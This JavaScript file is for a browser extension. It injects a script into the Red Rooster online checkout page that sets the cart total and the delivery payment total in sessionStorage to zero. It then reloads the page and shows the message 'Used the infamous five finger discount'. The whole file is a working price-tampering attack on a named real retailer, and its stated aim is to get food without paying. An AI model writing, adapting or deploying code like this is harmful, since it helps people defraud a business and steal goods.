document.getElementById("applyDiscount").addEventListener("click", () => {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const tab = tabs[0];
        if (tab.url.startsWith("https://www.redrooster.com.au/order/payment/")) {
            chrome.scripting.executeScript({
                target: { tabId: tab.id },
                func: modifyCart,
            });
        } else {
            alert("This extension only on the Red Rooster checkout page.");
        }
    });
});

// Define the function to modify the cart
function modifyCart() {
    try {
        // Get the cart and checkout data from sessionStorage
        let cart = sessionStorage.getItem("cart")
        let checkout = sessionStorage.getItem("checkout");

        if (cart  !== null && checkout !== null) {
            // Spoof cart price
            cart = JSON.parse(cart);
            cart.total = 0;
            cart = JSON.stringify(cart);
            sessionStorage.setItem("cart", cart);

            // Spoof checkout price for delivery

            checkout = JSON.parse(checkout);
            checkout.totalPayment = 0;
            checkout = JSON.stringify(checkout);

            sessionStorage.setItem("checkout", checkout);

            // Reload the page
            alert('Used the infamous five finger discount.');
            window.location.reload();
        } else {
            alert("Cart not found in sessionStorage.");
        }
    } catch (error) {
        alert("Error modifying cart: " + error);
    }
}
 